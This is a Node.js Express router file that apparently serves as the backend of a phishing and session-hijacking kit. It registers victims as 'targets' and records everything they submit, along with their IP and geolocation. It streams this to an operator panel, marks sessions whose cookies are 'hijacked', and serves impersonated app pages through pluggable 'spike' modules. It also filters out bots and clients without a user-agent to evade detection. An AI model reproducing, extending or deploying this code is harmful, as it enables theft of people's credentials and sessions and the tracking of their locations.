const express = require('express')
const ipWare = require("ipware")
const { default: axios } = require("axios")
const { randomString, getConfig, cout } = require("../utils/server-helpers")
const { targetDB } = require('../utils/DB')
const { checkSpikeModule } = require("../spikes/ApplicationConfig")
const path = require("path")
const router = express.Router()

router.route("/").get((req, res) => { // getting response
    const { id } = req.query
    const targetCollection = targetDB.collection(id, false)
    const targetData = targetCollection.find({})
    if (targetData) {
        res.send(targetData.response)
    }
}).post(async (req, res) => { // getting basic info
    const { id } = req.body
    const body = req.body
    const targetCollection = targetDB.collection(id, false)
    const targetData = targetCollection.find({})

    IO.emit(id, {
        type: 2,
        data: body,
        description: `type: basic information`
    })
    targetData.data.push(body)

    let ipData = {}
    try {
        let ip = ipWare().get_ip(req).clientIp
        let data = await (await axios.get(`https://ipinfo.io/${ip}/json`)).data
        if (data["loc"]) {
            const url = `https://maps.google.com/maps?q=${data["loc"]}`
            data["location"] = `<a target="_blank" href="${url}">${url}</a>`
        }
        ipData = data
    } catch (error) {
        ipData = { error: error.data, message: error.message }
    }

    IO.emit(id, {
        type: 2,
        data: ipData,
        description: "type: ip information"
    })
    targetData.data.push(ipData)
    targetCollection.update({}, { data: targetData.data })

    res.send("OK")
})

router.route("/:appName").get((req, res) => {
    if (requestBlocker(req)) return

    const { appName } = req.params
    const device = req.device.type
    const { email } = req.query

    const id = randomString(10)
    const newTarget = {
        id,
        email: email || "",
        appName,
        device,
        cookies: "pending",
        time: new Date(),
        data: [],
        response: getConfig("response")
    }

    targetDB.collection(id, false).insert(newTarget)
    res.redirect(`/ws-app/${appName}/${id}`)
}).post(async (req, res) => {
    try {
        const body = req.body
        const id = randomString(10)
        const newTarget = Object.assign(body, {
            id,
            cookies: "none",
            time: new Date(),
            data: [],
            response: getConfig("response")
        })

        targetDB.collection(id, false).insert(newTarget)
        res.send(`/panel?id=${id}`)
    } catch (error) {
        cout.err(error)
        res.send("ERROR")
    }
})

router.route("/:appName/:id").get(async (req, res) => {
    const { appName, id } = req.params
    const device = req.device.type

    if (requestBlocker(req)) return
    if (!targetDB.info().collections.includes(id)) return

    const targetCollection = targetDB.collection(id, false)
    const targetData = targetCollection.find({})

    if (targetData) {
        if (targetData.cookies == "hijacked") {
            res.send(targetData.response)
            return
        }

        delete targetData.data
        const targetConfiguration = Object.assign(targetData, { device, useragent: req.headers['user-agent'] })

        const { SpikeApplication } = require(`../spikes/spikesModules/${appName}`)
        const application = new SpikeApplication(targetConfiguration)
        const response = await application.getRequest()
        res.send(response)
        return
    }

    res.sendStatus(500)
}).post(async (req, res) => {
    const { appName, id } = req.params
    const device = req.device.type
    const body = req.body

    if (requestBlocker(req)) return
    if (!targetDB.info().collections.includes(id)) return

    const targetCollection = targetDB.collection(id, false)
    const targetData = targetCollection.find({})

    if (targetData) {
        if (targetData.cookies == "hijacked") {
            res.send(targetData.response)
            return
        }

        targetData.data.push(body)
        targetCollection.update({}, { data: targetData.data })
        IO.emit(id, {
            type: 2,
            data: body,
            description: `type: ${body.spikeType}`
        })

        delete targetData.data
        const targetConfiguration = Object.assign(targetData, { device, useragent: req.headers['user-agent'] })

        const { SpikeApplication } = require(`../spikes/spikesModules/${appName}`)
        const application = new SpikeApplication(targetConfiguration)
        const response = await application.postRequest(body)
        res.send(response)
        return
    }
    
    res.sendStatus(500)
})

function requestBlocker(req) {
    const blockKeys = [
        req.device.type,
        req.headers["user-agent"],
        checkSpikeModule(req.params.appName)
    ]

    const blockValues = [
        "bot",
        undefined,
        false
    ]

    for (let i = 0; i < blockKeys.length; i++) {
        if (blockKeys[i] == blockValues[i]) {
            return true
        }
    }
    return false
}

module.exports = router